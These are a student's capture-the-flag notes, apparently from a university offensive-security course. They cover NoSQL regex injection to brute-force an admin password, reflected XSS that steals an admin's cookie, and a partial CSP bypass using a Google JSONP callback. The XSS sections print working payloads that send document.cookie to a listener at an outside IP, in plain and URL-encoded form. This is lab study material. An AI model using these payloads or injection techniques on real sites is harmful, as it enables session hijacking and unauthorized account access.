## ðŸŸ¢ no-sql-1 (100)
- Goal
	- Brute-force admin's password (is the flag itself)
- Observations
	- Try to log-in > Inspect Request sent > inputs are wrapped in strings (by browser)
		- Because we want to use query operators for No-SQL, we want the inputs to be JSON objects instead
		- Method: Write a Python requests script to send payload as JSON
- Method
	- Make username: {"$gt":""}
		- Assume this will match the admin (the only) user
	- Make password: {"$regex": f"^{flag}{char}"}
		- flag is a string that we gradually build up by brute-forcing character by character
		- char is the character that we try to test
	- Beware Pitfall!
		- For regex characters we want to test, make sure to escape them first using backslash. Otherwise, they will be interpreted as a regex operator and the flag we brute-force will not have the correct characters, but just the regex wildcards like * or ?

## ðŸŸ¢ Nuclear Code Break-In (100)
- Topic: No-SQL - Blind
- Goal: infiltrate as admin
- Initial observations
	- Login
		- Try logging in with an account I registered > inspect the POST request > the browser automatically wraps input for username and password each in quotes (sent as strings)
		- I think I need to write a Python script to send the payload as {}
	- Register
		- username
		- password
		- email 
		- description
		- ^ how are these used?
		- ^ what if I try to register as admin?
			- "Username already exists" 500 Status Code
				- This is info I can use? Wait actually, I should be going to login and blind-sql? But why would they give me a register page then?
	- Profile (Only after login) 
		- ?username=`<your username>`
		- http://offsec-chalbroker.osiris.cyber.nyu.edu:10001/profile?username=a
		- what if I try: http://offsec-chalbroker.osiris.cyber.nyu.edu:10001/profile?username=admin
			- Unauthorized.
			- So there must be some checking that I don't see in the URL? Because it is a POST request I don't see for example the password variable?
			- How to view POST vars?
	- Pitfalls!!!
		- When testing chars with regex expressions, be careful when testing regex special operator chars like * and ?
			- in the list of testable chars, make sure to escape special regex characters with a backslash so that we are testing it as a literal and not using it as a regex 
				- That is why in the previous chal you were getting weird results of chars returning as * or ?. Because they serve as regex operators and match

## ðŸŸ¢ XSS 1 (100)
Given:
- admin website
	- We enter a URL that the admin will click on
- actual website 
	- "Get admin's cookie"
	- We enter name input and click enter

Solve:
The goal of XSS is to attack another user as a user of the same website. Here, we aim to attack the admin user. Specifically, we attack the admin by stealing their cookie. What can we do?

Let's solve this problem by thinking backwards. To get admin cookie, we want the admin to send their cookie out, to a place where we can read it. Heading onto the website and trying to enter our name, we notice that whatever we enter gets displayed on the page. We can leverage this to display the admin cookie. 

Initial thought: let admin click on a URL that contains script to send POST request to the website with their cookie as their "name". Problem: they click on the URL and they see the name displayed on their screen. How do I see it on my screen? We need a way for admin to send the cookie out to ME...

Recall the lecture, we mentioned something about using existing websites online that we can see the ... posted contents of? So we can construct a malicious URL that will send as a POST request the user's cookie to that website, and we head to that website to view it? Might work...

Observations about website:
- after entering name, we are led to the /greet page
	- Input gets stored into ?name URL variable
		- We will inject the script tags here
			- Try on our own browser: enter `http://offsec-chalbroker.osiris.cyber.nyu.edu:10003/greet?name=_<script>alert(1)</script>_` and we get an alert to the screen!
			- Try on our own browser for name input: `<script>var xhr=new XMLHttpRequest();xhr.open('GET','http://68.183.28.210:8000/'+document.cookie,false);xhr.send();</script>`
				- It works! I see the GET request when I run a http server on my VM


We go to actual website, enter for name input:
`<script>var xhr=new XMLHttpRequest();xhr.open('GET','http://68.183.28.210:8000/'+document.cookie,false);xhr.send();</script>`. We take this URL and send it on the admin website:
`http://offsec-chalbroker.osiris.cyber.nyu.edu:10003/greet?name=%3Cscript%3Evar+xhr%3Dnew+XMLHttpRequest%28%29%3Bxhr.open%28%27GET%27%2C%27http%3A%2F%2F68.183.28.210%3A8000%2F%27%2Bdocument.cookie%2Cfalse%29%3Bxhr.send%28%29%3B%3C%2Fscript%3E`

# IGNORE FOLLOWING SECTION
### XSS 2
Initial gather of info
- Goal: provide URL that admin will click on
- Actual website
	- Check header: Content-Security-Policy|default-src 'self'; script-src 'self' [https://*.google.com](https://*.google.com "https://*.google.com"); object-src 'none';
		- This means clients can only execute scripts from google domain and self. 
- Test it on ourselves: %3Cscript%3Ealert%281%29%3C%2Fscript%3E
	- Does not work...gets displayed as the name
	- Probs because of restricted domain
	- Let's see if we can find a JSONP endpoint that has google domain
		- JSONP endpoint is a URL you visit with an injected script in the URL, which it returns to you whatever you entered but as a JSON object

http://offsec-chalbroker.osiris.cyber.nyu.edu:10002/greet?name=%3Cscript%3Ehttps://www.google.com/complete/search?client=chrome&q=123&jsonp=alert(1)%3C/script%3E


this is a workable JSONP:
https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)


http://offsec-chalbroker.osiris.cyber.nyu.edu:10002/greet?name=%3Cscript%3Ehttps://accounts.google.com/o/oauth2/revoke?callback=alert(1337)%3C/script%3E


Step 1: alert on my browser:
- http://offsec-chalbroker.osiris.cyber.nyu.edu:10002/greet?name=%3Cscript%20src=%22https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)%22%3E%3C/script%3E
- works!
Step 2: try seeing my own cookie:
- http://offsec-chalbroker.osiris.cyber.nyu.edu:10002/greet?name=%3Cscript%20src=%22https://accounts.google.com/o/oauth2/revoke?callback=alert(document.cookie)%22%3E%3C/script%3E
- works!
Step 3: send my cookie to my own VM
- http://offsec-chalbroker.osiris.cyber.nyu.edu:10002/greet?name=%3Cscript%20src=%22https://accounts.google.com/o/oauth2/revoke?callback=var xhr=new XMLHttpRequest();xhr.open('GET','http://68.183.28.210:8000/'+document.cookie,false);xhr.send();%22%3E%3C/script%3E

<script>var xhr=new XMLHttpRequest();xhr.open('GET','http://68.183.28.210:8000/'+document.cookie,false);xhr.send();</script>

%3Cscript%3Evar+xhr%3Dnew+XMLHttpRequest%28%29%3Bxhr.open%28%27GET%27%2C%27http%3A%2F%2F68.183.28.210%3A8000%2F%27%2Bdocument.cookie%2Cfalse%29%3Bxhr.send%28%29%3B%3C%2Fscript%3E
https://accounts.google.com/o/oauth2/revoke?callback=alert($$$$);alert("wow");

ok so seems like the callback only does one function... how to pack all the XML things into a function that I can call...

http://offsec-chalbroker.osiris.cyber.nyu.edu:10002/greet?name=%3Cscript%20src=%22https://accounts.google.com/o/oauth2/revoke?callback=%3Cscript%3Ealert(document.cookie);alert(%22wow%22);%22%3E%3C/script%3E

http://offsec-chalbroker.osiris.cyber.nyu.edu:10002/greet?name=%3Cscript%20src=%22https://accounts.google.com/o/oauth2/revoke?callback=alert(document.cookie);alert(leet)%22%3E%3C/script%3E
